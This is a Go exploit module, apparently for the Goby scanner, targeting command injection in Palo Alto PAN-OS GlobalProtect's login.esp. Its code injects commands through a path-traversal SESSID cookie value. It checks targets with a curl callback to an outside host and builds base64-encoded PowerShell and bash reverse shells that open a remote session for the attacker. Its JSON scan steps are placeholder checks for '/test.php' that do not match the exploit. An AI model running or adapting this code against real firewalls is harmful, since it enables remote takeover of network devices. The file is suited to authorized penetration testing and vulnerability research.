package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Palo Alto Networks PAN-OS /global-protect/login.esp Command Execution Vulnerability",
    "Description": "<p>Palo Alto Networks PAN-OS /global-protect/login.esp has a command execution vulnerability.</p><p>An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and first control the entire web server.</p>",
    "Product": "paloalto-Firewall",
    "Homepage": "https://www.paloaltonetworks.com/",
    "DisclosureDate": "2023-04-26",
    "PostTime": "2024-04-26",
    "Author": "Town",
    "FofaQuery": "body=\"/global-protect\" && body=\"portal/images/\"",
    "GobyQuery": "body=\"/global-protect\" && body=\"portal/images/\"",
    "Level": "3",
    "Impact": "<p>Palo Alto Networks PAN-OS /global-protect/login.esp has a command execution vulnerability.</p><p>An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and first control the entire web server.</p>",
    "Recommendation": "<p>1. The vulnerability has not been officially fixed yet. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://www.paloaltonetworks.com/\">https://www.paloaltonetworks.com/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "Command",
            "show": ""
        },
        {
            "name": "command",
            "type": "input",
            "value": "id",
            "show": "attackType=Command"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Palo Alto Networks PAN-OS /global-protect/login.esp 命令注入漏洞",
            "Product": "paloalto-Firewall",
            "Description": "<p>Palo Alto Networks PAN-OS /global-protect/login.esp&nbsp;存在命令执行漏洞。<br></p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.paloaltonetworks.com/\">https://www.paloaltonetworks.com/</a><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\"><a href=\"https://www.paloaltonetworks.com/\"></a></span><a href=\"https://www.yulongyidong.com/\"></a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Palo Alto Networks PAN-OS /global-protect/login.esp&nbsp;存在命令执行漏洞。<br></p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Palo Alto Networks PAN-OS /global-protect/login.esp Command Execution Vulnerability",
            "Product": "paloalto-Firewall",
            "Description": "<p>Palo Alto Networks PAN-OS /global-protect/login.esp has a command execution vulnerability.</p><p>An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and first control the entire web server.</p>",
            "Recommendation": "<p>1.&nbsp;The vulnerability has not been officially fixed yet. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://www.paloaltonetworks.com/\">https://www.paloaltonetworks.com/</a><br></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3.&nbsp;Unless necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>Palo Alto Networks PAN-OS /global-protect/login.esp has a command execution vulnerability.</p><p>An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and first control the entire web server.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10944"
}`

	setReverseRequestHashCGFYVM := func(reverseType string, isBase64 bool) (string, chan string, error) {
		typeList := map[string]string{
			"reverse_windows": "reverse_windows",
			"reverse_linux":   "reverse_linux_none",
		}
		if revserTypeNew := typeList[reverseType]; revserTypeNew == "" {
			return "", nil, errors.New("reverse type error")
		}
		waitSessionCh := make(chan string)
		if rp, err := godclient.WaitSession(reverseType, waitSessionCh); err != nil || len(rp) >= 0 {
			if reverseType == "reverse_windows" {
				command := godclient.ReverseTCPByPowershell(rp)
				if isBase64 {
					utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
					buf := make([]byte, len(utf16Bytes)*2)
					for i, v := range utf16Bytes {
						buf[i*2] = byte(v)
						buf[i*2+1] = byte(v >> 8)
					}
					command = "powershell.exe -e " + base64.StdEncoding.EncodeToString(buf)
				}
				return command, waitSessionCh, nil
			} else if reverseType == "reverse_linux" {
				command := godclient.ReverseTCPByBash(rp)
				if isBase64 {
					command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
				}
				return command, waitSessionCh, nil
			}
		}
		return "", waitSessionCh, errors.New("reverse port error")
	}

	var runCommandAdufcnadf34123 = func(u *httpclient.FixUrl, cmd string) error {
		uri := "/global-protect/login.esp"
		payload := "SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/" + goutils.RandomHexString(3) + "`" + cmd + "`"
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Cookie", payload)
		_, err := httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return err
		}
		return nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(6)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := "curl+http://" + checkUrl
			err := runCommandAdufcnadf34123(u, cmd)
			if err != nil {
				return false
			}
			if !godclient.PullExists(checkStr, time.Second*15) {
				return false
			}
			ss.VulURL = u.FixedHostInfo + "/global-protect/login.esp"
			return true
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			if attackType == "Reverse" {
				reverseType := ss.Params["reverseType"].(string)
				if command, waitSessionCh, err := setReverseRequestHashCGFYVM(reverseType, false); command != "" {
					log.Println(command)
					command = strings.ReplaceAll(command, " ", "${IFS}")
					go runCommandAdufcnadf34123(expResult.HostInfo, command)
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
				return expResult
			}

			command := goutils.B2S(ss.Params["command"])
			command = strings.ReplaceAll(command, " ", "+")
			if attackType == "Command" {
				err := runCommandAdufcnadf34123(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = "命令已成功执行，但该漏洞无法回显，请自行确认"
				return expResult
			}

			return expResult
		},
	))
}
